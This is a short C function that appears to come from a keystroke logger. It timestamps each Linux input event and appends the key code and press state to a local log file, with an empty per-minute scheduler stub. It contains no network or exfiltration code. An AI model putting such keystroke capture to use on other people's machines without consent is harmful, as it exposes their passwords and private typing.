void log_in_file(struct input_event ev) {
	//printf("Logging...");

	time_t t = time(NULL);
	struct tm tm = *localtime(&t);

	FILE* fptr = fopen(LOG_FILE, "a");
	// print( [date time] keycode keyvalue ) - keyvalue => {press; lift; long press}
	fprintf(fptr, "[ %d-%02d-%02d %02d:%02d:%02d ] key %i state %i\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
	if(tm.tm_sec == 0) {
		// schedular section

		//fprintf(fprt, "%s\n", "1 minute check\n");
	}
	fclose(fptr);
	//printf("  logged\n");

}

